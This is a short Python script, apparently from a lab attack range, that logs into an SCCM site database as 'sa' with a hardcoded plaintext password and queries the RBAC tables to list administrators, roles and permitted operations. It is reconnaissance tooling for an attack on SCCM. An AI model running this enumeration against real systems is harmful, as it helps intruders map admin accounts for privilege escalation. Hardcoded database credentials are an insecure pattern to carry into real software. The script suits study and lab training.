# SCCM RBAC enumeration — analyst_t1 (ws01 ATTACK)
import pyodbc, sys

conn = pyodbc.connect('DRIVER={SQL Server};SERVER=mbr02.range.local,1433;DATABASE=CM_CAD;UID=sa;PWD=s@_P@ssw0rd!L@b!;Encrypt=no;TrustServerCertificate=yes;Connection Timeout=8')
print('[+] connected')

def q(title, query, limit=40):
    print('\n=== %s ===' % title)
    try:
        cur = conn.cursor(); cur.execute(query); rows = cur.fetchall()
        if not rows: print('(no rows)')
        for r in rows[:limit]: print(list(r))
    except Exception as e:
        print('ERR: %s' % e)

q('RBAC_Admins columns', "SELECT TOP 1 * FROM RBAC_Admins")
q('RBAC_Admins', "SELECT AdminID, LogonName, IsGroup, AccountType, CreatedBy FROM RBAC_Admins")
q('RBAC_Roles', "SELECT RoleID, RoleName, BuiltIn FROM RBAC_Roles")
q('RBAC_Categories', "SELECT CategoryID, CategoryName, CategoryType FROM RBAC_Categories")
q('RBAC_CategoryMemberships', "SELECT * FROM RBAC_CategoryMemberships")
q('RBAC_RoleOperations (roles with ops)', "SELECT TOP 20 * FROM RBAC_RoleOperations")
q('RBAC_ObjectOperations (operation names)', "SELECT TOP 15 * FROM RBAC_ObjectOperations")
print('\nRBAC_DONE')
